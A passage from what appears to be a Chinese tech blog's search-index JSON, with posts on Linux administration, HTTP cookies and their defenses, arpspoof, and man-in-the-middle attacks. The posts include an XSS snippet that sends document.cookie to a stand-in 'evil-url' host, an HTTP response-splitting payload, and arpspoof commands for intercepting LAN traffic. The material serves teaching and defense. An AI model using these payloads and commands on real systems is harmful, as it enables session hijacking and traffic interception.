若忘记绑定网卡 123enp3s0f0: flags=6211&lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST&gt; mtu 1500enp3s0f1: flags=6211&lt;UP,BROADCAST,RUNNING,SLAVE,MULTICAST&gt; mtu 1500 ifconfig 会发现网卡标志位 存在 SLAVE 标识。 删除modprobe.conf配置文件 1rm -rf /etc/modprobe.d/modprobe.conf 重启网络即可 service network rerestart","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Centos","slug":"Centos","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Centos/"}]},{"title":"Cookie","slug":"network/Cookie","date":"2018-04-19T11:59:27.000Z","updated":"2018-11-19T16:06:49.377Z","comments":true,"path":"2018/04/19/network/Cookie/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/04/19/network/Cookie/","excerpt":"Cookie简介定义Cookie（复数形态Cookies），中文名称为小型文本文件或小甜饼，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。定义于RFC2109。是网景公司的前雇员Lou Montulli在1993年3月的发明。 分类Cookie总是保存在客户端中，按在客户端中的存储位置，可分为内存Cookie和硬盘Cookie。 内存Cookie由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘Cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久Cookie和持久Cookie。","text":"Cookie简介定义Cookie（复数形态Cookies），中文名称为小型文本文件或小甜饼，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。定义于RFC2109。是网景公司的前雇员Lou Montulli在1993年3月的发明。 分类Cookie总是保存在客户端中，按在客户端中的存储位置，可分为内存Cookie和硬盘Cookie。 内存Cookie由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘Cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久Cookie和持久Cookie。 Cookie的用途通常Cookie有三种主要的用途。 Session管理http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是Base Auth，但是这种方式，早期的网站用户名和密码在每次请求中会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。 所以现在大多数站点采用基于Cookie的Session管理方式： 当用户登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，（如果该Cookie尚未到期）浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。 个性化Cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。 在购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。 另一个个性化应用是广告定制。你访问过的网站会写入一些Cookies在你的浏览器里，这些Cookies会被一些广告公司用来售卖更精准的广告。比如你曾访问过一家汽车网站，那你浏览其他网站时可能就会看到一些汽车类的广告。 User TrackingCookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。 Cookie的基本特性http request浏览器向服务器发起的每个请求都会带上Cookie： 1234GET /index.html HTTP/1.1Host: www.example.orgCookie: foo=value1;bar=value2Accept: */* http response服务器给浏览器的返回可以设置Cookie： 123456HTTP/1.1 200 OKContent-type: text/htmlSet-Cookie: name=valueSet-Cookie: name2=value2; Expires=Wed,09 June 2021 10:18:32 GMT(content of page) ####Cookie识别功能的说明 如果在一台计算机中安装多个浏览器，每个浏览器都会以独立的空间存放Cookie。因为Cookie中不但可以确认用户信息，还能包含计算机和浏览器的信息，所以一个用户使用不同的浏览器登录或者用不同的计算机登录，都会得到不同的Cookie信息，另一方面，对于在同一台计算机上使用同一浏览器的多用户群，Cookie不会区分他们的身份，除非他们使用不同的用户名登录。 Cookie有关的术语Session Cookie当Cookie没有设置超时时间，那么Cookie会在浏览器退出时销毁，这种Cookie是Session Cookie。 ####Persistent Cookie/Tracking Cookie 设置了超时时间的Cookie，会在指定时间销毁，Cookie的维持时间可以持续到浏览器退出之后，这种Cookie被持久化在浏览器中。 很多站点用Cookie跟踪用户的历史记录，例如广告类站点会使用Cookie记录浏览过哪些内容，搜索引擎会使用Cookie记录历史搜索记录，这时也可以称作Tracking Cookie，因为它被用于追踪用户行为。 Secure Cookie服务器端设置Cookie的时候，可以指定Secure属性，这时Cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有Secure Cookie。 设置secure cookie的方式举例： 1Set-Cookie: foo=bar; Path=/; Secure HttpOnly Cookie服务器端设置Cookie的时候，也可以指定一个HttpOnly属性。 1Set-Cookie: foo=bar; Path=/; HttpOnly 设置了这个属性的Cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。 Third-Party Cookie第三方Cookie的使用场景通常是iframe，例如www.a.com嵌入了一个www.ad.com的广告iframe，那么www.ad.com设置的cookie属于不属于www.a.com，被称作第三方Cookie。 SupercookieCookie会从属于一个域名，例如www.a.com，或者属于一个子域，例如b.a.com。但是如果Cookie被声明为属于.com会发生什么？这个Cookie会在任何.com域名生效。这有很大的安全性问题。这种Cookie被称作Supercookie。 浏览器做出了限制，不允许设置顶级域名Cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。 现代主流浏览器都很好的处理了Supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对Supercookie进行攻击。 Zombie Cookie/Evercookie僵尸Cookie是指当用户通过浏览器的设置清除Cookie后可以自动重新创建的Cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当Cookie被删除时，从其他存储中恢复。 Evercookie是实现僵尸Cookie的主要技术手段。 Cookie劫持包含了一些敏感消息：用户名，电脑名，使用的浏览器和曾经访问的网站。用户不希望这些内容泄漏出去，尤其是当其中还包含有私人信息的时候。 XSS（Cross site scripting，跨站脚本）是最基本的Cookie窃取方式。当攻击者通过XSS获取到用户Cookie后，攻击者将利用Cookie通过合法手段进入用户账号，浏览大部分用户资源。下图是Cookie劫持的示意图： ​ 另外，攻击者也能制造Cookie投毒。一般认为，Cookie在储存和传回服务器期间没有被修改过，而攻击者会在Cookie送回服务器之前对其进行修改，达到自己的目的。例如，在一个购物网站的Cookie中包含了顾客应付的款项，攻击者将该值改小，达到少付款的目的。这就是Cookie投毒。 利用XSS漏洞获取Cookie攻击方法 一旦站点中存在可利用的XSS漏洞，攻击者可直接利用注入的js脚本获取Cookie，进而通过异步请求把标识Session id的Cookie上报给攻击者。 123var img = document.createElement(&apos;img&apos;);img.src = &apos;http://evil-url?c=&apos; + encodeURIComponent(document.cookie);document.getElementsByTagName(&apos;body&apos;)[0].appendChild(img); 防御方法 根据上面HttpOnly Cookie的介绍，一旦一个Cookie被设置为HttpOnly，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个Cookie进行Session维持，但客户端js对其不可见。那么即使存在XSS漏洞也无法简单的利用其进行Session劫持攻击了。 上面说的防御方法无法利用XSS进行简单的攻击，但可以通过XSS结合其他漏洞获取Cookie。比如XSS结合phpinfo页面、HTTP Response Splitting。 XSS结合phpinfo页面攻击方法 利用php开发应用会有一个phpinfo页面，这个页面会dump出请求信息，其中就包括Cookie信息。如下图所示的_SERVER[&quot;HTTP_COOKIE&quot;]变量。 ​ 如果开发者没有关闭这个页面，就可以利用XSS漏洞向这个页面发起异步请求，获取到页面内容后parse出Cookie信息，然后上传给攻击者。 ​ phpinfo是比较常见的一种dump请求的页面，但不限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。 防御方法 关闭所有phpinfo类dump request信息的页面。 HTTP Response Splitting攻击方法 通常的XSS攻击都是把输入内容注入到response的content中，HTTP Response Splitting是一种针对header的注入。 例如，一个站点接受参数做302跳转： 1www.example.com/?r=http://baidu.com request信息为： 1234GET /example.com?r=http://baidu.com\\r\\nHTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n response为： 1234HTTP/1.1 302 Found\\r\\nLocation: http://baidu.com\\r\\nContent-Type: text/html\\r\\n\\r\\n 这样页面就302跳转到了百度了。攻击者利用r参数可以注入header，r参数不是简单的url，而是包含\\r\\n的header信息： 1http://example.com/?r=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EDefaced!%3C/h1%3E%3C/html%3E 这样，response就变成了： 123456789HTTP/1.1 302 Found\\r\\nLocation: \\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\nX-XSS-Protection: 0\\r\\n&lt;html&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;Defaced!&lt;/h1&gt;&lt;/html&gt;Content-Type: text/html\\r\\n\\r\\n 其中，X-XSS-Protection: 0 是关闭浏览器的XSS保护机制。 防御方法 针对header的内容做过滤，不能漏掉\\r\\n，特别是Location，host，referrer等。 网络监听防御方法 网站使用Https协议。 防御网络监听通常有两种方式：信道加密和内容加密。网站开启Https连接属于信道加密，使用https协议的请求都被SSL加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。 但是，如果网站同时支持http和https，那么还是可以使用网络监听http请求获取Cookie。如果网站只支持Https，当用户直接输入example.com（大部分用户不会手动输入协议前缀），Web服务器通常的处理是返回301要求浏览器重定向到https://www.example.com。因为这次301请求是http的，而且带了Cookie，因此又将Cookie明文暴露在了网络上。 针对这个问题，有两个防御思路： 把标识Session的Cookie设置成Secure。上面提到的Secure Cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。 设置Strict-Transport-Security header，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。","categories":[],"tags":[{"name":"Network","slug":"Network","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Network/"}]},{"title":"Linux 修改主机名","slug":"yunwei/Linux-修改主机名","date":"2018-04-13T14:12:26.000Z","updated":"2018-08-21T12:27:52.722Z","comments":true,"path":"2018/04/13/yunwei/Linux-修改主机名/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/04/13/yunwei/Linux-修改主机名/","excerpt":"临时修改主机名 hostname123456789[root@localhost sysconfig]# hostnamelocalhost.localdomain[root@localhost sysconfig]# [root@localhost sysconfig]# [root@localhost sysconfig]# hostname svn.domain[root@localhost sysconfig]# [root@localhost sysconfig]# hostname svn.domain[root@localhost sysconfig]#","text":"临时修改主机名 hostname123456789[root@localhost sysconfig]# hostnamelocalhost.localdomain[root@localhost sysconfig]# [root@localhost sysconfig]# [root@localhost sysconfig]# hostname svn.domain[root@localhost sysconfig]# [root@localhost sysconfig]# hostname svn.domain[root@localhost sysconfig]# 永久修改主机名redhat/cetnos 修改：1234567[root@localhost etc]# cat /etc/sysconfig/networkNETWORKING=yesNETWORKING_IPV6=noHOSTNAME=svn.domain[root@localhost etc]# cat /etc/hosts127.0.0.1 svn.domain localhost deb/ubuntu修改12root@Kali:/etc# cat /etc/hostname Kali","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"chkconfig&service","slug":"commands/chkconfig-service","date":"2018-04-10T13:04:31.000Z","updated":"2018-12-05T11:05:59.232Z","comments":true,"path":"2018/04/10/commands/chkconfig-service/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/04/10/commands/chkconfig-service/","excerpt":"chkconfig简介chkconfig命令主要用来更新(启动或停止或修改)和查询系统服务的运行级信息。 chkconfig不是立即自动禁用或激活一个服务，而是改变符号链接，从而影响开机自启动运行。 chkconfig 依赖/etc/init.d目录中的进程管理脚本。 123456789[root@gitserver ~]# chkconfig --helpchkconfig 版本 1.7.4 - 版权 (C) 1997-2000 Red Hat, Inc.在 GNU 公共许可条款下，本软件可以免费重新发布。用法：chkconfig [--list] [--type &lt;type&gt;] [name] chkconfig --add &lt;name&gt; chkconfig --del &lt;name&gt; chkconfig --override &lt;name&gt; chkconfig [--level &lt;levels&gt;] [--type &lt;type&gt;] &lt;name&gt; &lt;on|off|reset|resetpriorities&gt;","text":"chkconfig简介chkconfig命令主要用来更新(启动或停止或修改)和查询系统服务的运行级信息。 chkconfig不是立即自动禁用或激活一个服务，而是改变符号链接，从而影响开机自启动运行。 chkconfig 依赖/etc/init.d目录中的进程管理脚本。 123456789[root@gitserver ~]# chkconfig --helpchkconfig 版本 1.7.4 - 版权 (C) 1997-2000 Red Hat, Inc.在 GNU 公共许可条款下，本软件可以免费重新发布。用法：chkconfig [--list] [--type &lt;type&gt;] [name] chkconfig --add &lt;name&gt; chkconfig --del &lt;name&gt; chkconfig --override &lt;name&gt; chkconfig [--level &lt;levels&gt;] [--type &lt;type&gt;] &lt;name&gt; &lt;on|off|reset|resetpriorities&gt; chkconfig原理/etc/rcX.d 目录存放各个运行级别下Linux自启动服务。 X指运行级别 1234567891011121314151617181920212223242526272829[root@gitserver ~]# ls -ls /etc/rc* 0 lrwxrwxrwx 1 root root 10 9月 15 2017 /etc/rc0.d -&gt; rc.d/rc0.d #运行模式0下需要启动的服务0 lrwxrwxrwx 1 root root 10 9月 15 2017 /etc/rc1.d -&gt; rc.d/rc1.d #运行模式1下需要启动的服务0 lrwxrwxrwx 1 root root 10 9月 15 2017 /etc/rc2.d -&gt; rc.d/rc2.d #运行模式2下需要启动的服务0 lrwxrwxrwx 1 root root 10 9月 15 2017 /etc/rc3.d -&gt; rc.d/rc3.d #运行模式3下需要启动的服务0 lrwxrwxrwx 1 root root 10 9月 15 2017 /etc/rc4.d -&gt; rc.d/rc4.d #运行模式4下需要启动的服务0 lrwxrwxrwx 1 root root 10 9月 15 2017 /etc/rc5.d -&gt; rc.d/rc5.d #运行模式5下需要启动的服务0 lrwxrwxrwx 1 root root 10 9月 15 2017 /etc/rc6.d -&gt; rc.d/rc6.d #运行模式6下需要启动的服务0 lrwxrwxrwx 1 root root 13 10月 25 09:02 /etc/rc.local -&gt; rc.d/rc.local/etc/rc.d:总用量 40 drwxr-xr-x. 2 root root 97 1月 9 14:22 init.d0 drwxr-xr-x. 2 root root 45 8月 4 2017 rc0.d0 drwxr-xr-x. 2 root root 45 8月 4 2017 rc1.d0 drwxr-xr-x. 2 root root 45 8月 4 2017 rc2.d0 drwxr-xr-x. 2 root root 45 8月 4 2017 rc3.d0 drwxr-xr-x. 2 root root 45 8月 4 2017 rc4.d0 drwxr-xr-x. 2 root root 45 8月 4 2017 rc5.d0 drwxr-xr-x. 2 root root 45 8月 4 2017 rc6.d4 -rw-r--r--. 1 root root 596 3月 8 14:47 rc.local[root@gitserver rc3.d]# runlevel ## 查看运行级别N 3[root@gitserver rc3.d]# [root@gitserver rc3.d]# ls -ls总用量 00 lrwxrwxrwx. 1 root root 20 6月 21 2017 K50netconsole -&gt; ../init.d/netconsole0 lrwxrwxrwx. 1 root root 17 6月 21 2017 S10network -&gt; ../init.d/network 进程管理脚本放置于/etc/init.d目录下， rcX.d自启动脚本链接到/etc/init.d 添加删除服务chkconfig命令添加或删除操作其实就是创建或删除这个目录的软连接。 chkcofnig -add添加服务时，服务脚本必须存放在/etc/ini.d/目录下。 1234567891011121314151617181920212223242526272829[root@pgunimation rc3.d]# ls -lstotal 00 lrwxrwxrwx 1 root root 20 Apr 22 21:23 K50netconsole -&gt; ../init.d/netconsole0 lrwxrwxrwx. 1 root root 21 Jun 25 2017 S05qemukvmga -&gt; /etc/init.d/qemukvmga0 lrwxrwxrwx. 1 root root 17 Mar 13 2017 S10network -&gt; ../init.d/network0 lrwxrwxrwx. 1 root root 17 Jan 4 23:29 S11gwarp -&gt; /etc/init.d/gwarp[root@pgunimation rc3.d]# [root@pgunimation rc3.d]# chkconfig --del netconsole[root@pgunimation rc3.d]# [root@pgunimation rc3.d]# ls -lstotal 00 lrwxrwxrwx. 1 root root 21 Jun 25 2017 S05qemukvmga -&gt; /etc/init.d/qemukvmga0 lrwxrwxrwx. 1 root root 17 Mar 13 2017 S10network -&gt; ../init.d/network0 lrwxrwxrwx. 1 root root 17 Jan 4 23:29 S11gwarp -&gt; /etc/init.d/gwarp[root@pgunimation rc3.d]# [root@pgunimation rc3.d]# chkconfig --add netconsole[root@pgunimation rc3.d]# [root@pgunimation rc3.d]# ls -ls total 00 lrwxrwxrwx 1 root root 20 Apr 22 21:23 K50netconsole -&gt; ../init.d/netconsole0 lrwxrwxrwx. 1 root root 21 Jun 25 2017 S05qemukvmga -&gt; /etc/init.d/qemukvmga0 lrwxrwxrwx. 1 root root 17 Mar 13 2017 S10network -&gt; ../init.d/network0 lrwxrwxrwx. 1 root root 17 Jan 4 23:29 S11gwarp -&gt; /etc/init.d/gwarp[root@pgunimation rc3.d]# [root@pgunimation rc3.d]# chkconfig --list gwarp 0:off 1:off 2:on 3:on 4:on 5:on 6:offnetconsole 0:off 1:off 2:off 3:off 4:off 5:off 6:offnetwork 0:off 1:off 2:on 3:on 4:on 5:on 6:offqemukvmga 0:off 1:off 2:on 3:on 4:on 5:on 6:off 每个软链接的命名都是”大写S/K+运行顺序+脚本名称”, 其中开机自启动为S, 不随机自启动为K 管理脚本写法12345678910111213141516171819202122232425262728293031323334353637383940[root@pgunimation init.d]# cat gwarp #!/bin/sh -e PATH=/bin #* 以下几行并不会被chkconfig作为注释，会被完整解析*## chkconfig: 2345 05 96 ### 缺省运行级别 05/96 意思启动顺序S05 /停止顺序K96# description: Static ARP entry for Gateway ### 服务描述### BEGIN INIT INFO# Provides: gwarp# Required-Start: $network# Required-Stop: $network# Default-Start: 2 3 4 5# Default-Stop: 0 1 6# Short-Description: STATIC ARP GW# Description: STATIC ARP GW### END INIT INFOcase &quot;$1&quot; in start) echo &quot;starting&quot; cd /usr/bin ls ;; stop) echo &quot;Stopping&quot; kill -9 ;; restart) $0 stop || true $0 start ;; *) echo &quot;Usage: ls &#123;start|stop|restart&#125;&quot; exit 1 ;; esac 将脚本放置于/etc/init.d 目录下， 即可使用chkconfig --add 添加服务，进行缺省启动配置。 httpd完整服务脚本 修改服务自启动级别chkcofig --level 修改链接文件名规则，S/K 12345678910111213141516171819202122[root@pgunimation rc3.d]# chkconfig --level 3 netconsole on [root@pgunimation rc3.d]# chkconfig --listgwarp 0:off 1:off 2:on 3:on 4:on 5:on 6:offnetconsole 0:off 1:off 2:off 3:on 4:off 5:off 6:offnetwork 0:off 1:off 2:on 3:on 4:on 5:on 6:offqemukvmga 0:off 1:off 2:on 3:on 4:on 5:on 6:off[root@pgunimation rc3.d]# [root@pgunimation rc3.d]# ls -ls total 00 lrwxrwxrwx. 1 root root 21 Jun 25 2017 S05qemukvmga -&gt; /etc/init.d/qemukvmga0 lrwxrwxrwx. 1 root root 17 Mar 13 2017 S10network -&gt; ../init.d/network0 lrwxrwxrwx. 1 root root 17 Jan 4 23:29 S11gwarp -&gt; /etc/init.d/gwarp0 lrwxrwxrwx 1 root root 20 Apr 22 21:19 S50netconsole -&gt; ../init.d/netconsole[root@pgunimation rc3.d]# chkconfig --level 3 netconsole off [root@pgunimation rc3.d]# [root@pgunimation rc3.d]# [root@pgunimation rc3.d]# ls -ls total 00 lrwxrwxrwx 1 root root 20 Apr 22 21:19 K50netconsole -&gt; ../init.d/netconsole0 lrwxrwxrwx. 1 root root 21 Jun 25 2017 S05qemukvmga -&gt; /etc/init.d/qemukvmga0 lrwxrwxrwx. 1 root root 17 Mar 13 2017 S10network -&gt; ../init.d/network0 lrwxrwxrwx. 1 root root 17 Jan 4 23:29 S11gwarp -&gt; /etc/init.d/gwarp serviceservice命令用来快速开启或者停止Linux服务程序。 yum/apt-get 安装新的服务程序后，都会自动在/etc/init.d 中添加一个管理本服务进程的shell脚本。 例如: 12/etc/init.d/mysql/etc/init.d/nginx 此时，我们想要启动服务即可使用 /etc/init.d/xxx start 或者 service xxx start 启动 如 12/etc/init.d/mysql startservicr mysql start service 其实本质即加载/etc/init.d/xxx start 服务启动 。 12[root@pgunimation init.d]# service --helpUsage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]","categories":[{"name":"命令","slug":"命令","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"arpspoof","slug":"kali/arpspoof","date":"2018-04-03T13:47:13.000Z","updated":"2018-11-19T16:05:45.662Z","comments":true,"path":"2018/04/03/kali/arpspoof/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/04/03/kali/arpspoof/","excerpt":"Arpspoof​ Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗。","text":"Arpspoof​ Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗。 凡是使用Arpspoof工具必先开启 路由转发功能。1root@kali:~# echo 1 &gt; /proc/sys/net/ipv4/ip_forward 流量操纵攻击 启动Arpspoof注入攻击目标系统。攻击的方法是攻击者（192.168.2.51）发送ARP数据包，以欺骗网关（192.168.2.1）和目标系统（192.168.2.253）。下面首先欺骗目标系统，执行命令如下所示： 1234567root@Kali:~# arpspoof -i eth0 -t 192.168.2.253 192.168.2.10:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d 攻击者(192.168.2.51) 向目标主机 (192.168.2.253)发送数据包。 其中 0:c:29:3:7d:7d 是攻击者MAC地址，64:0:6a:47:15:be 是目标主机的MAC地址。 1arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d 当收到显示时， 目标主机 向网关发送数据，都将发送到攻击者192.168.6.102 上。 ​ Arpspoof 注入攻击网关。 1234567891011root@Kali:~# arpspoof -i eth0 -t 192.168.2.1 192.168.2.2530:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d 以上输出信息显示了攻击者向网关192.168.2.1发送的数据包。当该攻击成功后，网关192.168.2.1发给目标系统192.168.2.253上的信息发送到攻击者主机192.168.2.51上。 1arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d ​ 以上步骤都执行成功后，攻击者就相当于控制了网关与目标主机双向传输的数据。攻击者可以通过收到的数据，查看到目标系统上重要的信息。 ​ ​ 完整分析过程1234567891011root@Kali:~# arpspoof -i eth0 -t 192.168.2.253 192.168.2.10:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d 12345678root@Kali:~# arpspoof -i eth0 -t 192.168.2.1 192.168.2.2530:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d 目标主机 发送 icmp 请求到网关， 但实际映射到 51攻击主机。 攻击主机即192.168.2.51 将 192.168.2.253 的icmp数据包进行转发 经过转发后，51攻击主机(欺骗) 发送icmp请求包到达 192.168.2.1 网关 网关 192.168.2.1 回复icmp请求包到 192.168.2.253 (这台实际为攻击主机即51) 51攻击主机 转发 网关icmp应答包 51攻击主机(模拟) 网关发送icmp应答包到达 192.168.2.253目的主机","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"},{"name":"渗透","slug":"渗透","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/渗透/"},{"name":"Kali","slug":"Kali","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kali/"}]},{"title":"中间人攻击","slug":"kali/中间人攻击","date":"2018-04-02T12:07:50.000Z","updated":"2018-11-19T16:06:24.421Z","comments":true,"path":"2018/04/02/kali/中间人攻击/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/04/02/kali/中间人攻击/","excerpt":"什么是“中间人攻击”？ ​ 中间人攻击（Man-in-the-Middle Attack，简称“MiTM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。入侵者把这台计算机模拟一台或两台原始计算机，使“中间人”能够与原始计算机建立活动连接并允许其读取或篡改传递的信息，然而两个原始计算机用户却认为他们是在互相通信，因而这种攻击方式并不很容易被发现。所以中间人攻击很早就成为了黑客常用的一种古老的攻击手段，并且一直到今天还具有极大的扩展空间。","text":"什么是“中间人攻击”？ ​ 中间人攻击（Man-in-the-Middle Attack，简称“MiTM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。入侵者把这台计算机模拟一台或两台原始计算机，使“中间人”能够与原始计算机建立活动连接并允许其读取或篡改传递的信息，然而两个原始计算机用户却认为他们是在互相通信，因而这种攻击方式并不很容易被发现。所以中间人攻击很早就成为了黑客常用的一种古老的攻击手段，并且一直到今天还具有极大的扩展空间。 中间人攻击常见的两种方法：ARP欺骗、DNS欺骗。ARP欺骗： ​ 